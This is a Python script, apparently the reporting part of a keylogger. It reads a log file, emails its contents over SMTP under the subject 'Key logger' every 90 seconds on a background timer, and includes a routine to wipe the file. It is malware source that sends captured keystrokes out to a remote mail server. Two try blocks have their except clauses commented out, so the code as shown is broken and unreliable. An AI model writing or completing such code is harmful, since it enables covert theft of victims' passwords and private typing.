#!/bin/python3

import smtplib, ssl, threading
from threading import Timer, Thread, Event


class Send_Email(object):
    def __init__(self, smtp_server, smtp_port, email, password, file_name):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.email = email
        self.password = password
        self.file_name = file_name
        self.subject = "Key logger"
        self.message = ""


    def write_email(self):
        self.message = f"Subject: {self.subject}\n\n{self.message}"
        context = ssl.create_default_context()
        with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
            server.starttls(context=context)
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, self.message)

    def read_content_of_file(self):
        try:
            with open(str(self.file_name), 'r+')as a:
                for i in a:
                    #print(i)
                    self.message += i
#        except IOError as e:
#            print(f"An error occured: {e}")
#
    def delete_content_of_file(self):
        try:
            with open(str(self.file_name), "w"):
                pass
#        except IOError as e:
#            print(f"An error occured: {e}")
#
    def report(self):
        self.read_content_of_file()
        if len(self.message) > 0:
            self.write_email()
            #self.delete_content_of_file()
            self.message = ""

        timer = Timer(interval=90, function=self.report)
        timer.daemon = True
        timer.start()


